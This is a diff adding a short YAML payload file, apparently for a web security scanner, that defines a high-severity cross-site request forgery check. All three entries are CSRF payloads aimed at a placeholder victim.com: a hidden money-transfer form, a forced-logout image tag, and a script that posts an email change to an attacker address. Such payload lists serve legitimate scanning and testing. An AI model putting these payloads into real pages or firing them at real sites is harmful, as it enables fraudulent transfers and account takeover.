@@ -1,0 +1,7 @@
+name: "Cross-Site Request Forgery"
+type: "csrf1"
+severity: "high"
+payloads:
+  - "<form action='http://victim.com/transfer' method='POST'><input type='hidden' name='amount' value='1000'><input type='hidden' name='account' value='attacker'></form>"
+  - "<img src='http://victim.com/logout'>"
+  - "<script>fetch('http://victim.com/change-email', {method: 'POST', body: 'email=attacker@evil.com'})</script>"
